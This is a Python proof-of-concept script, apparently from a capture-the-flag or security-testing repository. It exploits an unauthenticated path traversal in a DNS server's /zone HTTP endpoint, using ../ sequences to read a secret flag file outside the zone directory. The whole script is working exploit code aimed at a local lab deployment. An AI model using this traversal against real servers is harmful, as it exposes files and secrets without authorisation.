#!/usr/bin/env python3
"""
PoC #5: Path traversal via the public "read zone file" endpoint
---------------------------------------------------------------
Bug: the HTTP endpoint GET /zone?name=<name> returns the text of a zone file
from the configured zone directory, building the path as
`snprintf(full, "%s/%s", ZONE_DIR, name)` with NO sanitisation of `name`
(admin_worker() in dnsm.c). A `name` full of `../` sequences escapes ZONE_DIR
and reads any file the DNS process can access; the raw content is returned in
the HTTP response.

This endpoint is UNAUTHENTICATED by design - it is the HTTP sibling of AXFR, a
read-only "zone transparency" feature - so there is NO admin token involved.
That is the point of this PoC versus the admin side-channel: any third party
who can reach the HTTP port exploits this with no credentials at all.

How this proves it, purely over the wire: request
/zone?name=../../../../../../home/ctf/dnsm/secret/flag.txt and confirm the
response body contains this deployment's real DNSM_FLAG value. That file lives
OUTSIDE DNSM_ZONE_DIR on purpose (entrypoint.sh writes it there from the
runtime-generated DNSM_FLAG env var - see generate-secrets.sh), and the files
UNDER DNSM_ZONE_DIR carry no secret (the per-deployment flag is only written to
that out-of-root file, never into the served zone). So recovering the flag
proves both the traversal and a genuine secret disclosure, not a read of some
world-readable OS file or of a secret the endpoint would serve anyway.

Run the server first, then:
    python3 05_zone_file_traversal.py [host] [http_port] [expected_flag]

If expected_flag is omitted, it is read from the DNSM_FLAG environment
variable, falling back to the repo's local-dev default.
"""
import os
import sys
import urllib.parse
import urllib.request

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
EXPECTED_FLAG = (sys.argv[3] if len(sys.argv) > 3
                  else os.environ.get("DNSM_FLAG", "FLAG{local-dev-default}"))

# Extra leading "../" segments are harmless (POSIX path resolution just stays
# at "/" once you walk past root), which keeps this robust to exactly how many
# levels DNSM_ZONE_DIR sits below the flag file.
TRAVERSAL = "../../../../../../home/ctf/dnsm/secret/flag.txt"


def main():
    url = f"http://{HOST}:{PORT}/zone?name={urllib.parse.quote(TRAVERSAL, safe='')}"
    try:
        # No credentials: the endpoint is public, which is the whole point.
        body = urllib.request.urlopen(url, timeout=6).read().decode(errors="replace")
    except Exception as e:
        print(f"[-] /zone request failed: {e}")
        return 1

    if EXPECTED_FLAG in body:
        print(f"[+] path traversal confirmed: read the runtime secret flag.txt "
              f"(OUTSIDE DNSM_ZONE_DIR) through the UNAUTHENTICATED /zone endpoint "
              f"-> {EXPECTED_FLAG!r}")
        return 0

    print(f"[-] expected flag {EXPECTED_FLAG!r} not found in response; traversal may be "
          f"blocked, or DNSM_FLAG doesn't match the running deployment")
    print("    response was:", body[:200])
    return 1


if __name__ == "__main__":
    sys.exit(main())
